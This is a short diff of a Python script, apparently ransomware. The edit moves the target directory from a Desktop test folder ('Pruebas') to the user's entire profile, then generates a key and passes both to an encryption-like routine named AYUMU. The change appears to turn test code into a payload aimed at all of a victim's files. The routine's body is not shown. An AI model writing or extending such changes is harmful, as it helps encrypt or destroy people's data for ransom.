@@ -127,7 +127,7 @@ def main():
     except Exception:
         pass
         
-    PATH = os.getenv("userprofile") + "\\Desktop\\Pruebas"
+    PATH = os.getenv("userprofile")
     llave = key()
     AYUMU(PATH , llave)
     
